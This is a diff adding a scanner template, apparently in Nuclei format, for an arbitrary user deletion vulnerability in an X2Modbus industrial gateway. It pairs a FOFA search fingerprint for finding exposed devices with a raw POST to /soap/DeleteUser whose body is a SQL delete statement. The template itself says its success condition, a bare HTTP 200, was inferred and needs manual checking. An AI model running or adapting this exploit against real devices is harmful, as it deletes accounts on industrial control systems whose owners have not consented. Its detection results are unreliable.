@@ -1,0 +1,44 @@
+id: poc-4cbc97ac489cbadee627
+info:
+  name: 上海迅饶自动化科技有限公司X2Modbus网关任意用户删除漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4cbc97ac489cbadee627e9b61c226198
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 4cbc97ac489cbadee627e9b61c226198
+    fofa: + fofa`server="SunFull-Webs" || icon_hash="-1384370370"`
+http:
+- raw:
+  - 'POST /soap/DeleteUser HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+
+    Accept: application/xml, text/xml, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: text/xml; charset=utf-8
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Length: 39
+
+    Connection: close
+
+    Cookie: language=zh-cn; language=zh-cn
+
+
+    delete from userid where username=''stc'''
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
